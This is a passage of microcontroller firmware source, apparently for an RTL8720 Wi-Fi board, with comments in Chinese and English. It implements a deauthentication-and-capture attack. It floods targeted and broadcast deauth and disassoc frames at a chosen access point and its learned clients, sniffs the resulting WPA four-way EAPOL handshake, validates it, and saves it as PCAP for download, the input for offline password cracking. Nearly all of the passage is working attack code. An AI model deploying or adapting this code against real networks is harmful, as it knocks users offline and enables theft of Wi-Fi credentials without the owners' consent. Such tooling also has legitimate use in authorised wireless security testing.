            const uint16_t reasons[3] = {7, 1, 4};
            for (int r = 0; r < 3; r++) { frame.reason = reasons[r]; for (int i = 0; i < 2; i++) { wifi_tx_raw_frame(&frame, sizeof(DeauthFrame)); delayMicroseconds(200); } }
          }
        } else {
          // 无已知客户端：更保守的AP采取更稀疏的广播推动（每3秒一次，最多1帧）
          static unsigned long lastNoClientBroadcastTs = 0;
          if (millis() - lastNoClientBroadcastTs > 3000) {
            lastNoClientBroadcastTs = millis();
            wifi_tx_broadcast_deauth(deauth_bssid, 7, 1, 1000);
          }
        }
// Resume capture quickly to avoid missing immediate EAPOL
        resumeCaptureAfterDeauth(120);
        wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
      }
      // 动态敏感度：当捕获到 M1 或 M3（AP->STA方向且含ACK），适度延长本轮嗅探时间
      {
        bool extend = false;
        for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
          ParsedEapolInfo einfo;
          bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
          if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
          if (p) {
            bool m1 = einfo.isFromAP && einfo.descriptorType == 0x02 && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
            bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
            if (m1 || m3) { extend = true; break; }
          }
        }
        if (extend && sniffInterval < 10000) { sniffInterval = 10000; }
      }
      if (hasBothHandshakeDirections() && capturedManagement.frameCount < 3) {
        if (g_verboseHandshakeLog) Serial.println(F("Early management capture trigger: both directions seen, switching to management capture..."));
        break;
      }
      // 最小嗅探时间门限：至少嗅探1.5秒才允许判定完成
      if ((millis() - sniffPhaseStart) >= 1500UL && isHandshakeComplete()) {
        if (g_verboseHandshakeLog) Serial.println(F("Complete 4-way handshake detected (after min sniff time), exiting sniff phase early"));
        break;
      }
    }

  if ((millis() - sniffPhaseStart) >= 1500UL && isHandshakeComplete() && capturedManagement.frameCount >= 3) {
      if (g_verboseHandshakeLog) Serial.println(F("Complete handshake and management frames captured, exiting capture loop"));
      break;
    }

    // 高效模式：窗口结束后若未完成，则暂停抓包 -> 突发解除认证 -> 等待2s -> 继续抓包
    if (g_captureMode == CAPTURE_MODE_EFFICIENT && !isHandshakeComplete()) {
      pauseCaptureForDeauth();
      const uint16_t reasonsE[2] = {7, 1};
      for (int r = 0; r < 2; r++) { wifi_tx_broadcast_deauth(deauth_bssid, reasonsE[r], 80, 150); }
      wifi_tx_broadcast_disassoc(deauth_bssid, 8, 10, 200);
      // 尽快恢复混杂模式，避免错过随后的EAPOL（将原2000ms离线等待改为在线等待）
      resumeCaptureAfterDeauth(100);
      wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
      delay(1900);
      // 不增加 attempts，直接进入下一轮嗅探窗口
      continue;
    }

    // 轻度定向诱发（仅主动模式）：当已捕获 M1/M3 但未见 M2/M4 时，对已学习的 STA 发送少量定向 deauth，促使补齐
    if (g_captureMode == CAPTURE_MODE_ACTIVE && !isHandshakeComplete() && knownClientCount > 0) {
      bool seenAPOnly = false;
      bool seenClient = false;
      for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
        ParsedEapolInfo einfo;
        bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
        if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
        if (p) {
          if (einfo.isFromAP) seenAPOnly = true; else seenClient = true;
        }
      }
      if (seenAPOnly && !seenClient) {
        // Pause capture for targeted deauth inducement
        pauseCaptureForDeauth();
        DeauthFrame frame;
        memcpy(&frame.source, deauth_bssid, 6);
        memcpy(&frame.access_point, deauth_bssid, 6);
        uint8_t localKnownCount = knownClientCount; if (localKnownCount > 8) localKnownCount = 8;
        for (uint8_t k = 0; k < localKnownCount; k++) {
          const uint8_t *sta = (const uint8_t*)knownClients[k];
          memcpy(&frame.destination, sta, 6);
          frame.reason = 1;
          for (int i = 0; i < 3; i++) { // 少量、低频
            wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
          }
        }
// Resume capture quickly to avoid missing immediate EAPOL
        resumeCaptureAfterDeauth(120);
        wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
      }
    }
  }
  
  if ((isHandshakeComplete() || (capturedHandshake.frameCount >= 2 && hasBothHandshakeDirections())) && capturedManagement.frameCount < 3) {
    if (g_verboseHandshakeLog) Serial.println(F("Starting dedicated management frame capture phase..."));
    unsigned long managementCaptureStart = millis();
    const unsigned long managementCaptureTimeout = 20000; // 20s
    allowAnyMgmtFrames = true;
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
    delay(50);
    wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
    while (capturedManagement.frameCount < 3 && (millis() - managementCaptureStart < managementCaptureTimeout)) {
      delay(20);
      if ((millis() - managementCaptureStart) % 1000 == 0) {
        wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
      }
    }
    allowAnyMgmtFrames = false;
  }
  
  captureAttempts++;
  
  if (g_verboseHandshakeLog) {
    Serial.print(F("Current handshake count: "));
    Serial.print(capturedHandshake.frameCount);
    Serial.print(F(" / "));
    Serial.print(MAX_HANDSHAKE_FRAMES);
    Serial.print(F(", management frames: "));
    Serial.print(capturedManagement.frameCount);
    Serial.print(F(" / "));
    Serial.print(MAX_MANAGEMENT_FRAMES);
    Serial.print(F(", callback triggered: "));
    Serial.print(sniffCallbackTriggered ? "YES" : "NO");
    Serial.print(F(", elapsed time: "));
    Serial.print((millis() - overallStart) / 1000);
    Serial.println(F("s"));
  }
  
  if (!sniffCallbackTriggered && (millis() - overallStart) > 5000) {
    if (g_verboseHandshakeLog) Serial.println(F("No callback triggered, re-enabling promiscuous mode..."));
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
    delay(100);
    wifi_set_promisc(RTW_PROMISC_ENABLE, rtl8720_sniff_callback, 1);
    sniffCallbackTriggered = false;
  }
  
  if (capturedHandshake.frameCount > 0 || capturedManagement.frameCount > 0) {
    if (g_verboseHandshakeLog) {
      Serial.print(F("Partial capture progress: "));
      Serial.print(capturedHandshake.frameCount);
      Serial.print(F(" handshake frames, "));
      Serial.print(capturedManagement.frameCount);
      Serial.println(F(" management frames - continuing..."));
    }
  }
  
  if (isHandshakeComplete() && hasBothHandshakeDirections()) {
    wext_set_channel(WLAN0_NAME, AP_Channel.toInt());
    std::vector<uint8_t> pcapData = generatePcapBuffer();
    if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
    globalPcapData = pcapData;
    handshakeDataAvailable = true;
    isHandshakeCaptured = true;
    // 记录统计与时间，用于WebUI展示和下载
    lastCaptureTimestamp = millis();
    lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
    lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
    handshakeJustCaptured = true;
    if (g_verboseHandshakeLog) Serial.println(F("Handshake data saved to global storage"));
    if (g_verboseHandshakeLog) printHandshakeData();
  }
  
  if (g_verboseHandshakeLog) Serial.println(F("Disabling promiscuous mode..."));
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  delay(200);
  if (g_verboseHandshakeLog) Serial.println(F("Restoring original channel..."));
  wext_set_channel(WLAN0_NAME, AP_Channel.toInt());
  delay(200);
  if (g_verboseHandshakeLog) Serial.println(F("Finished deauth+sniff cycle."));
  readyToSniff = false;
  sniffer_active = false;
  if (g_verboseHandshakeLog) Serial.println(F("=== Handshake capture completed status updated ==="));
  // 移除4帧回退：仅当严格完成逻辑设置了handshakeDataAvailable时，WebUI才显示已捕获
  // 抓包完成LED指示（在清除运行标记前设置）
  extern void completeHandshakeLED();
  completeHandshakeLED();
  // 抓包流程结束后，清除运行标记，避免WebUI卡住
  extern bool hs_sniffer_running;
  hs_sniffer_running = false;
}

// Helper function: extract frame type and subtype from the first two bytes.
void get_frame_type_subtype(const unsigned char *packet, unsigned int &type, unsigned int &subtype) {
  unsigned short fc = packet[0] | (packet[1] << 8);
  type = (fc >> 2) & 0x03;
  subtype = (fc >> 4) & 0x0F;
}

void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void* param) {
  (void)param;
  sniffCallbackTriggered = true;
  if (!packet || length < 24) { return; }
  
  static unsigned long lastDebugLog = 0;
  static int callbackCount = 0;
  static int totalFramesProcessed = 0;
  callbackCount++;
  totalFramesProcessed++;
  if (g_verboseHandshakeLog && (millis() - lastDebugLog > 5000)) {
    Serial.print(F("[Handshake] Callbacks triggered: "));
    Serial.print(callbackCount);
    Serial.print(F(", handshake frames: "));
    Serial.print(capturedHandshake.frameCount);
    Serial.print(F("/4, management frames: "));
    Serial.print(capturedManagement.frameCount);
    Serial.print(F("/10, total processed: "));
    Serial.println(totalFramesProcessed);
    lastDebugLog = millis();
    callbackCount = 0;
  }
  
  unsigned int type, subtype;
  get_frame_type_subtype(packet, type, subtype);
  
  // Management frames capture and selective client learning
  if (type == 0) {
    if (g_verboseHandshakeLog) {
      uint16_t fcdbg = packet[0] | (packet[1] << 8);
      Serial.print(F("[MGMT] subtype=")); Serial.print((fcdbg>>4)&0xF);
      Serial.print(F(" len=")); Serial.print(length);
      Serial.print(F(" bssid=")); if (length>=22) Serial.println(macToString(&packet[16],6)); else Serial.println("-");
    }
    // Capture common mgmt frames for UI/report
    if (subtype == 8 || subtype == 5 || subtype == 0 || subtype == 4) {
      bool isTargetBSSID = false;
      if (length >= 16) {
        bool standardMatch = true;
        for (int j = 0; j < 6; j++) {
          if (packet[10 + j] != _selectedNetwork.bssid[j]) { standardMatch = false; break; }
        }
        isTargetBSSID = standardMatch;
        if (!isTargetBSSID && length >= 12) {
          bool sourceMatch = true;
          for (int j = 0; j < 6; j++) {
            if (packet[6 + j] != _selectedNetwork.bssid[j]) { sourceMatch = false; break; }
          }
          isTargetBSSID = sourceMatch;
        }
        if (!isTargetBSSID && length >= 6) {
          bool destMatch = true;
          for (int j = 0; j < 6; j++) {
            if (packet[0 + j] != _selectedNetwork.bssid[j]) { destMatch = false; break; }
          }
          if (destMatch) isTargetBSSID = true;
        }
      }
      if (((isTargetBSSID) || (!strictCaptureMode && allowAnyMgmtFrames)) && capturedManagement.frameCount < MAX_MANAGEMENT_FRAMES) {
        ManagementFrame *mf = &capturedManagement.frames[capturedManagement.frameCount];
        mf->length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
        memcpy(mf->data, packet, mf->length);
        capturedManagement.frameCount++;
      }
      // 不在探测与信标阶段学习客户端，避免误将未关联STA加入
    }
    // 仅在与关联状态强相关的管理帧中学习客户端，且必须绑定目标BSSID
    if (length >= 24) {
      const uint8_t *da = &packet[4];
      const uint8_t *sa = &packet[10];
      const uint8_t *bssid = &packet[16];
      bool bssidMatch = true; for (int j=0;j<6;j++){ if (bssid[j] != _selectedNetwork.bssid[j]) { bssidMatch=false; break; } }
      if (bssidMatch) {
        // Association/Reassociation and state-change learning tied to target BSSID
        // 0: Assoc Req (SA=STA), 1: Assoc Resp (DA=STA)
        // 2: Reassoc Req (SA=STA), 3: Reassoc Resp (DA=STA)
        if (subtype == 0 || subtype == 2) {
          if (macIsUnicast(sa) && !macEquals6(sa, _selectedNetwork.bssid)) { addKnownClient(sa); touchKnownClient(sa); }
        } else if (subtype == 1 || subtype == 3) {
          if (macIsUnicast(da) && !macEquals6(da, _selectedNetwork.bssid)) {
            addKnownClient(da);
            touchKnownClient(da);
            uint16_t statusCode = 0xFFFF;
            if (parseAssocRespStatus(packet, length, statusCode)) {
              if (statusCode == 0) {
                // 仅在 AssocResp/ReassocResp 成功时标记“近时关联”
                markAuthAssocSeen(da);
                uint8_t idx = findKnownClientIndex(da);
                if (idx != 255) knownClientAssocRespLastMs[idx] = millis();
                if (g_verboseHandshakeLog) { Serial.print(F("[MGMT][AssocResp] success for STA ")); Serial.println(macToString(da,6)); }
              } else {
                if (g_verboseHandshakeLog) { Serial.print(F("[MGMT][AssocResp] non-success status=")); Serial.println(statusCode); }
              }
            }
          }
        }
        // 10: Disassoc, 12: Deauth (either address may be the STA)
        if (subtype == 10 || subtype == 12) {
          if (macIsUnicast(sa) && !macEquals6(sa, _selectedNetwork.bssid)) { addKnownClient(sa); touchKnownClient(sa); }
          if (macIsUnicast(da) && !macEquals6(da, _selectedNetwork.bssid)) { addKnownClient(da); touchKnownClient(da); }
        }
        // 11: Auth (heuristic: if SA==AP then DA is STA, else SA is STA) —— 不再用于“近时关联”的标记
        if (subtype == 11) {
          bool saIsAP = macEquals6(sa, _selectedNetwork.bssid);
          const uint8_t* sta = saIsAP ? da : sa;
          if (macIsUnicast(sta) && !macEquals6(sta, _selectedNetwork.bssid)) { addKnownClient(sta); touchKnownClient(sta); }
        }
      }
    }
  }
  
  // EAPOL detection (DATA frames only)
  if (type != 2) { return; }
  const unsigned char eapol_sequence[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int seq_len = sizeof(eapol_sequence);
  bool isEAPOL = false;
  bool isFromTargetBSSID = false;
  if (length >= 24) {
    const uint8_t *da, *sa, *bssid;
    if (extractAddrsForDataFrame(packet, length, da, sa, bssid)) {
      bool bssidMatch = true;
      for (int j=0;j<6;j++){ if (bssid[j] != _selectedNetwork.bssid[j]) { bssidMatch=false; break; } }
      if (bssidMatch) {
        isFromTargetBSSID = true;
      }
      if (g_verboseHandshakeLog) {
        uint16_t fcdbg = packet[0] | (packet[1] << 8);
        bool toDS = (fcdbg & (1<<8))!=0; bool fromDS = (fcdbg & (1<<9))!=0;
        Serial.print(F("[DATA] toDS=")); Serial.print(toDS); Serial.print(F(" fromDS=")); Serial.print(fromDS);
        Serial.print(F(" DA=")); Serial.print(macToString(da,6)); Serial.print(F(" SA=")); Serial.print(macToString(sa,6));
        Serial.print(F(" BSSID=")); Serial.print(macToString(bssid,6)); Serial.print(F(" bssidMatch=")); Serial.println(isFromTargetBSSID?"Y":"N");
      }
    }
  }
  // 在严格模式下，首先基于派生BSSID进行过滤，避免跨AP误判
  if (length >= 24 && strictCaptureMode) {
    if (!isFromTargetBSSID) {
      if (g_verboseHandshakeLog) Serial.println(F("[EAPOL][DROP] BSSID mismatch for target"));
      return;
    }
  }
  // Gate by AP involvement when strict mode is on (more robust across DS bit layouts)
  if (length >= 24 && strictCaptureMode) {
    // For data frames, Addr1/Addr2 are at offsets 4 and 10 respectively
    const uint8_t* da_apchk = &packet[4];
    const uint8_t* sa_apchk = &packet[10];
    bool apInvolved = macEquals6(da_apchk, _selectedNetwork.bssid) || macEquals6(sa_apchk, _selectedNetwork.bssid);
    if (!apInvolved) {
      if (g_verboseHandshakeLog) Serial.println(F("[EAPOL][DROP] AP not involved for target BSSID"));
      return;
    }
  }
  // Accept shorter frames too; some EAPOL frames can be compact
  if (length < 24 || length > 2000) { return; }
  for (unsigned int i = 0; i <= length - seq_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < seq_len; j++) { if (packet[i + j] != eapol_sequence[j]) { match = false; break; } }
    if (match) { isEAPOL = true; break; }
  }
  bool hasEAPOLSignature = false;
  if (!isEAPOL) {
    for (unsigned int i = 0; i <= length - 2; i++) { if (packet[i] == 0x88 && packet[i + 1] == 0x8E) { hasEAPOLSignature = true; break; } }
    if (hasEAPOLSignature) isEAPOL = true;
  }
  if (!isEAPOL) return;
  ParsedEapolInfo info; bool parsed = parseEapol(packet, length, info); if (!parsed && hasEAPOLSignature) parsed = parseEapolFromEthertype(packet, length, info);
  if (!parsed) return;
  if (g_verboseHandshakeLog) {
    Serial.print(F("[EAPOL] parsed desc=")); Serial.print(info.descriptorType);
    Serial.print(F(" keyInfo=0x")); Serial.print(info.keyInfo, HEX);
    Serial.print(F(" MIC=")); Serial.print(info.hasMic);
    Serial.print(F(" ACK=")); Serial.print(info.hasAck);
    Serial.print(F(" Install=")); Serial.print(info.hasInstall);
    Serial.print(F(" Secure=")); Serial.print(info.hasSecure);
  }
  // Prefer pairwise EAPOL-Key; allow first frame to bootstrap learning
  bool isPairwise = (info.descriptorType == 0x02) && ((info.keyInfo & (1 << 3)) != 0);
  if (!isPairwise && capturedHandshake.frameCount > 0) return;
  const uint8_t* da = &packet[4];
  const uint8_t* sa = &packet[10];
  if (!macIsUnicast(da) || !macIsUnicast(sa)) return;
  // Identify STA (non-AP). Some devices use randomized (locally-admin) MACs legitimately; do not reject.
  // const uint8_t* staMac = macEquals6(sa, _selectedNetwork.bssid) ? da : sa;
  // 仅在确认该数据帧属于目标BSSID时学习客户端，避免跨AP误加
  if (isFromTargetBSSID) {
    if (!macEquals6(sa, _selectedNetwork.bssid)) { addKnownClient(sa); touchKnownClient(sa); }
    if (!macEquals6(da, _selectedNetwork.bssid)) { addKnownClient(da); touchKnownClient(da); }
  }
  HandshakeFrame newFrame; newFrame.length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE; memcpy(newFrame.data, packet, newFrame.length);
  unsigned short seqControl = getSequenceControl(newFrame.data, newFrame.length);
  bool duplicate = false; unsigned long currentTime = millis();
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    HandshakeFrame *stored = &capturedHandshake.frames[i];
    unsigned short storedSeq = getSequenceControl(stored->data, stored->length);
    if (storedSeq == seqControl && stored->length == newFrame.length) {
      if (memcmp(stored->data, newFrame.data, newFrame.length) == 0) { duplicate = true; break; }
      if (currentTime - stored->timestamp < 100) { duplicate = true; break; }
    }
    ParsedEapolInfo storedInfo, newInfo;
    bool storedParsed = parseEapol(stored->data, stored->length, storedInfo); if (!storedParsed) storedParsed = parseEapolFromEthertype(stored->data, stored->length, storedInfo);
    bool newParsed = parsed ? true : parseEapol(newFrame.data, newFrame.length, newInfo); if (!newParsed) newParsed = parseEapolFromEthertype(newFrame.data, newFrame.length, newInfo);
    if (storedParsed && newParsed) {
      bool sameReplay = memcmp(storedInfo.replayCounter, newInfo.replayCounter, 8) == 0;
      bool sameDir = storedInfo.isFromAP == newInfo.isFromAP;
      bool sameDesc = storedInfo.descriptorType == newInfo.descriptorType;
      bool sameKeyInfo = storedInfo.keyInfo == newInfo.keyInfo;
      if (sameReplay && sameDir && sameDesc && sameKeyInfo) { duplicate = true; break; }
    }
  }
  uint8_t msgType = 0; ParsedEapolInfo cinfo; bool cparsed = parsed ? true : parseEapol(newFrame.data, newFrame.length, cinfo); if (!cparsed) cparsed = parseEapolFromEthertype(newFrame.data, newFrame.length, cinfo); if (cparsed) { bool m1 = cinfo.isFromAP && cinfo.descriptorType == 0x02 && cinfo.hasAck && !cinfo.hasMic && !cinfo.hasInstall; bool m2 = !cinfo.isFromAP && cinfo.descriptorType == 0x02 && cinfo.hasMic && !cinfo.hasAck && !cinfo.hasInstall; bool m3 = cinfo.isFromAP && cinfo.hasMic && cinfo.hasAck && cinfo.hasInstall; bool m4 = !cinfo.isFromAP && cinfo.hasMic && !cinfo.hasAck && !cinfo.hasInstall && cinfo.hasSecure; if (m1) msgType = 1; else if (m2) msgType = 2; else if (m3) msgType = 3; else if (m4) msgType = 4; else msgType = 0; }
  if (!duplicate && capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES) {
    memcpy(capturedHandshake.frames[capturedHandshake.frameCount].data, newFrame.data, newFrame.length);
    capturedHandshake.frames[capturedHandshake.frameCount].length = newFrame.length;
    capturedHandshake.frames[capturedHandshake.frameCount].timestamp = currentTime;
    capturedHandshake.frames[capturedHandshake.frameCount].sequence = seqControl;
    capturedHandshake.frames[capturedHandshake.frameCount].messageType = msgType;
    capturedHandshake.frameCount++;
  }
}

// 检查握手包完整性的函数实现
bool isHandshakeComplete() {
  if (capturedHandshake.frameCount < 2) return false;
  bool hasMessage1 = false, hasMessage2 = false, hasMessage3 = false, hasMessage4 = false;
  bool staLocked = false; uint8_t staMac[6] = {0};
  bool apReplayInit = false, staReplayInit = false; uint8_t apReplayPrev[8] = {0}, staReplayPrev[8] = {0};
  // 记录通过DS位推导的STA一致性（更可靠）
  bool staConsistent = true;
  // 保存M1..M4解析信息以进行回放计数精确校验
  ParsedEapolInfo mInfos[4]; uint8_t mCount = 0;
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    ParsedEapolInfo einfo;
    bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) continue;
    // 仅接受 Pairwise EAPOL-Key
    if (!(einfo.descriptorType == 0x02 && ((einfo.keyInfo & (1 << 3)) != 0))) continue;
    // 每帧派生BSSID必须等于目标
    const uint8_t *dda,*ssa,*bb;
    if (!extractAddrsForDataFrame(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, dda, ssa, bb)) continue;
    bool bssidOk = true; for (int j=0;j<6;j++){ if (bb[j] != _selectedNetwork.bssid[j]) { bssidOk=false; break; } }
    if (!bssidOk) continue;
    // 锁定并校验 STA MAC 一致性（基于DS位提取）
    const uint8_t *da = &capturedHandshake.frames[i].data[4];
    const uint8_t *sa = &capturedHandshake.frames[i].data[10];
    uint16_t fc = capturedHandshake.frames[i].data[0] | (capturedHandshake.frames[i].data[1] << 8);
    bool toDS = (fc & (1 << 8)) != 0; bool fromDS = (fc & (1 << 9)) != 0;
    const uint8_t* thisSta = (!toDS && fromDS) ? dda : (toDS && !fromDS) ? ssa : (einfo.isFromAP ? da : sa);
    if (!staLocked) { for (int j=0;j<6;j++) staMac[j] = thisSta[j]; staLocked = true; }
    else { bool same=true; for (int j=0;j<6;j++){ if (staMac[j]!=thisSta[j]) { same=false; break; } } if (!same) { staConsistent = false; continue; } }
    // 严格 M1–M4 Key Info 组合
    bool m1 = einfo.isFromAP && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
    bool m2 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall;
    bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
    bool m4 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall && einfo.hasSecure;
    // 重放计数单调性（分别对AP与STA方向）
    if (m1 || m3) {
      if (apReplayInit) { if (memcmp(einfo.replayCounter, apReplayPrev, 8) < 0) continue; }
      memcpy(apReplayPrev, einfo.replayCounter, 8); apReplayInit = true;
    } else if (m2 || m4) {
      if (staReplayInit) { if (memcmp(einfo.replayCounter, staReplayPrev, 8) < 0) continue; }
      memcpy(staReplayPrev, einfo.replayCounter, 8); staReplayInit = true;
    }
    hasMessage1 = hasMessage1 || m1;
    hasMessage2 = hasMessage2 || m2;
    hasMessage3 = hasMessage3 || m3;
    hasMessage4 = hasMessage4 || m4;
    if (m1 || m2 || m3 || m4) { if (mCount < 4) mInfos[mCount++] = einfo; }
  }
  if (!(staLocked && staConsistent && hasMessage1 && hasMessage2 && hasMessage3 && hasMessage4)) {
    if (g_verboseHandshakeLog) {
      Serial.print(F("[CHK-FAIL] M-set/STA: staLocked=")); Serial.print(staLocked);
      Serial.print(F(" staConsistent=")); Serial.print(staConsistent);
      Serial.print(F(" M1-4=")); Serial.print(hasMessage1); Serial.print(hasMessage2); Serial.print(hasMessage3); Serial.println(hasMessage4);
    }
    return false;
  }
  if (g_verboseHandshakeLog) Serial.println(F("[CHK] M1-4 present & STA consistent"));
  // 精确回放计数模式：M1与M2相等，M3与M4均为 M1+1（大端）
  const uint8_t *rcM1 = nullptr, *rcM2 = nullptr, *rcM3 = nullptr, *rcM4 = nullptr;
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    ParsedEapolInfo einfo;
    bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) continue;
    if (!(einfo.descriptorType == 0x02 && ((einfo.keyInfo & (1 << 3)) != 0))) continue;
    bool m1 = einfo.isFromAP && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
    bool m2 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall;
    bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
    bool m4 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall && einfo.hasSecure;
    if (m1 && !rcM1) rcM1 = einfo.replayCounter;
    if (m2 && !rcM2) rcM2 = einfo.replayCounter;
    if (m3 && !rcM3) rcM3 = einfo.replayCounter;
    if (m4 && !rcM4) rcM4 = einfo.replayCounter;
  }
  if (!(rcM1 && rcM2 && rcM3 && rcM4)) {
    if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] Replay pointers missing for one or more M1..M4"));
    return false;
  }
  if (!rcEquals(rcM1, rcM2)) {
    if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] rc(M1) != rc(M2)"));
    return false;
  }
  // 某些AP实现不会在M3/M4对回放计数严格+1，而是保持与M1/M2相同或+1
  bool m3Ok = rcEquals(rcM3, rcM1) || rcIsPlusOne(rcM3, rcM1);
  bool m4Ok = rcEquals(rcM4, rcM2) || rcIsPlusOne(rcM4, rcM1);
  if (!m3Ok) { if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] rc(M3) not equal to M1 or M1+1")); return false; }
  if (!m4Ok) { if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] rc(M4) not equal to M2 or M1+1")); return false; }
  if (g_verboseHandshakeLog) Serial.println(F("[CHK] Replay counters pattern OK"));
  // 需要近时 Auth/Assoc 佐证：该 STA 在最近窗口内必须出现过认证/关联
  const unsigned long nowMs = millis();
  uint8_t idx = findKnownClientIndex(staMac);
  if (idx == 255) {
    if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] STA not in knownClients table"));
    return false;
  }
  // 仅接受最近成功的 AssocResp/ReassocResp 作为“近时入网”依据
  const unsigned long windowMs = 6000; // 6 秒窗口，更严格
  if (knownClientAuthAssocLastMs[idx] == 0) {
    if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] No recent AssocResp/ReassocResp observed for STA"));
    return false;
  }
  if ((nowMs - knownClientAuthAssocLastMs[idx]) > windowMs) {
    if (g_verboseHandshakeLog) {
      Serial.print(F("[CHK-FAIL] AssocResp/ReassocResp too old, delta(ms)="));
      Serial.println(nowMs - knownClientAuthAssocLastMs[idx]);
    }
    return false;
  }
  // 进一步要求：明确的 AssocResp 成功时间戳（与上字段一致时通过）
  if (knownClientAssocRespLastMs[idx] == 0 || (nowMs - knownClientAssocRespLastMs[idx]) > windowMs) {
    if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] No recent successful AssocResp within window"));
    return false;
  }
  if (g_verboseHandshakeLog) Serial.println(F("[CHK] Recent AssocResp/ReassocResp within window OK"));
  return true;
}

// 判断是否已捕获到来自 AP 与 Client 双向的 EAPOL
bool hasBothHandshakeDirections() {
  bool seenAP = false, seenClient = false;
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    ParsedEapolInfo einfo;
    bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (p) {
      if (einfo.isFromAP) seenAP = true; else seenClient = true;
    }
  }
  return seenAP && seenClient;
}


// 仅进行M1–M4形态、同一STA、BSSID匹配与回放计数模式校验，不要求Auth/Assoc近时佐证
static __attribute__((unused)) bool isFourWayStructurallyValid() {
  if (capturedHandshake.frameCount < 4) return false;
  bool hasMessage1 = false, hasMessage2 = false, hasMessage3 = false, hasMessage4 = false;
  bool staLocked = false; uint8_t staMac[6] = {0};
  bool staConsistent = true;
  const uint8_t *rcM1 = nullptr, *rcM2 = nullptr, *rcM3 = nullptr, *rcM4 = nullptr;
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    ParsedEapolInfo einfo;
    bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) continue;
    if (!(einfo.descriptorType == 0x02 && ((einfo.keyInfo & (1 << 3)) != 0))) continue;
    // Derived BSSID must match target
    const uint8_t *da, *sa, *bb; if (!extractAddrsForDataFrame(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, da, sa, bb)) continue;
    bool bssidOk = true; for (int j=0;j<6;j++){ if (bb[j] != _selectedNetwork.bssid[j]) { bssidOk=false; break; } } if (!bssidOk) continue;
    uint16_t fc = capturedHandshake.frames[i].data[0] | (capturedHandshake.frames[i].data[1] << 8);
    bool toDS = (fc & (1 << 8)) != 0; bool fromDS = (fc & (1 << 9)) != 0;
    const uint8_t* thisSta = (!toDS && fromDS) ? da : (toDS && !fromDS) ? sa : (einfo.isFromAP ? da : sa);
    if (!staLocked) { for (int j=0;j<6;j++) staMac[j] = thisSta[j]; staLocked = true; }
    else { bool same=true; for (int j=0;j<6;j++){ if (staMac[j]!=thisSta[j]) { same=false; break; } } if (!same) { staConsistent = false; continue; } }
    bool m1 = einfo.isFromAP && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
    bool m2 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall;
    bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
    bool m4 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall && einfo.hasSecure;
